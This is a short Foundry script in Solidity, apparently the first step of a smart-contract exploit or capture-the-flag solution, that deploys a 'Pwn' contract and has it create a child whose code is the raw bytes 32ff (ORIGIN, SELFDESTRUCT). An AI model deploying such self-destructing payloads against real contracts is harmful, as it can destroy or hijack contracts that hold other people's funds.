// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/Pwn.sol";

contract step1 is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        Pwn pwn = new Pwn();
        pwn.set(hex"32ff");// Selfdestruct up in this
        address child = pwn.deploy();
        console.log("Pwn deployed at", address(pwn));
        console.log("Child deployed at", child);
        vm.stopBroadcast();
    }
}
